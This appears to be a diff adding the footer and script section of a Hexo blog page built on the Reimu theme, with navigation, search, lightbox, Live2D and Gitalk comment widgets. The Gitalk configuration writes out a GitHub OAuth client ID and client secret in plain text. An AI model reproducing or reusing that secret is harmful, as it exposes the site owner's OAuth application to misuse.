+      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/gitalk/dist/gitalk.min.js" data-pjax></script>
+
+  
+  <script data-pjax>
+    var gitalkId = location.pathname;
+    var gitalk = new Gitalk({
+      clientID: '0efb4a442bc09d1ba17e',
+      clientSecret: 'd26f520fef841de4f4388029a0d5c0f4730357cf',
+      repo: 'https://github.com/Yyjccc/yyjccc.github.io.git',
+      owner: 'Yyjccc',
+      admin: "Yyjccc",
+      id: gitalkId, // Ensure uniqueness and length less than 50
+      distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    if (document.getElementById('comments')) {
+      gitalk.render('comments')
+    }
+  </script>
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    quicklink.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.0-alpha.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+  </html>
+
